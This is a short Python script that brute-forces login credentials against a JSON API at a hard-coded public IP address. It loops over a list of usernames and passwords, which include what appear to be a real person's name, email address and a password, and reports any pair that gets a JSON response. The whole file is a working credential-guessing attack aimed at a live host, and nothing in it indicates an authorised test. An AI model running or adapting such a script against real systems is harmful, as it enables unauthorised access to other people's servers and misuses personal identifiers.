import urllib.request
import json

url = "http://196.188.72.250:3000/api/query"

usernames = ["admin", "tafesetadios", "tafesetadios@gmail.com", "FLEET-77"]
passwords = ["admin", "Neo@77877", "FLEET-77", "tafesetadios", "tafesetadios@gmail.com", "jarvis", "JARVIS"]

for u in usernames:
    for p in passwords:
        auth_str = f"{u}:{p}"
        payload = {
            "query": "develon",
            "auth": auth_str
        }
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            url, 
            data=data, 
            headers={"Content-Type": "application/json"}
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as response:
                content_type = response.headers.get("Content-Type", "")
                body = response.read().decode('utf-8')
                if "json" in content_type:
                    print(f"SUCCESS: {auth_str} returned JSON!")
                    print(body[:500])
                    break
                else:
                    print(f"FAILED: {auth_str} returned {content_type}")
        except Exception as e:
            print(f"ERROR: {auth_str} -> {e}")
